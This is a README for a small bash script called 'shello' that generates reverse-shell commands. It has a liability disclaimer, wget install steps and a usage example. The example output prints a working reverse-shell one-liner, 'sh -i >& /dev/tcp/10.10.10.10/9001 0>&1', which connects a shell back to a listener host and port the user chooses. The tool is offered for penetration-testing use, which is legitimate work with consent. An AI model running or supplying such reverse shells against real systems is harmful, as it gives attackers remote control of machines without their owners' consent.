# shello
A small script to generate reverse shells.

![image](https://user-images.githubusercontent.com/63207324/210773410-1e0baa45-187e-4955-8ed1-ed390951296f.png)

### Disclaimer:
This tool is only for testing and academic purposes and can only be used where strict consent has been given. Do not use it for illegal purposes! It is the end user’s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this tool and software.

### Installation:

```shell
$ wget https://raw.githubusercontent.com/Yuma-Tsushima07/shello/main/shello.sh
$ chmod +x shello.sh
```

### Usage:

```shell
$ ./shello.sh
```
Choose a reverse shell which you want then specify your `LHOST` and `LPORT`:
![image](https://user-images.githubusercontent.com/63207324/210773593-ab49d902-d61d-452d-b650-c7575da3c266.png)

```sh
[+] Select an Option:  1

[ + ] Enter LHOST:   10.10.10.10

[ + ] Enter LPORT:  9001

[*] Your Bash-i Shell:  
sh -i >& /dev/tcp/10.10.10.10/9001 0>&1
```

